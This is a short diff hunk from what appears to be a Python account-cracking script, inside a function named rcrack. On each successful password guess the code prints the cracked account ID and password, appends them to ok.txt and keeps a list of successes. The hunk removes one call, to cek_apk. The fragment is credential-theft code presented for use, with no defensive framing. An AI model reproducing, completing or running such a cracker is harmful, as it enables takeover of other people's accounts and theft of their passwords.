@@ -251,7 +251,7 @@ def rcrack(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[7:22]
 				print('\33[1;92m[Successful] '+cid+' | '+ps+'\33[0;97m')
-				cek_apk(session,coki)
+			
 				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
